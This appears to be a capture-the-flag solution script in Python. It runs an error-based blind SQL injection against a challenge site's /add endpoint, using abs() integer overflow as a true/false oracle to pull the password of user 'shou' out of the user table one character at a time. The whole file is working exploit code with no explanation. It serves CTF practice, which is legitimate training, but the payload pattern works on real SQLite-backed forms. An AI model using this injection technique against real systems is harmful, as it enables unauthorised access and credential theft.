import requests
import random
import string
url = 'http://phish.ny.ctf.so/add'

#abs(-9223372036854775808)

def generate_random_str(randomlength=16):
    str_list = [random.choice(string.digits + string.ascii_letters) for i in range(randomlength)]
    random_str = ''.join(str_list)
    return str(random_str)


flag = 'we{e0df7105-edcd-4dc6-'
for i in range(23,100):
    print(i)
    for j in '-'+'_'+'{'+'}'+string.printable:
        payload = f"-abcby23') union select 1,'{generate_random_str()}'||abs(case when (substr((select password from user where username ='shou'),{i},1)='{j}') then -9223372036854775808 else 0 end) -- "
        data = {
            'password':'123',
            'username': payload
        }
        r = requests.post(url, data= data)
        if 'overflow' in r.text:
            flag+=j
            print(flag)
            break
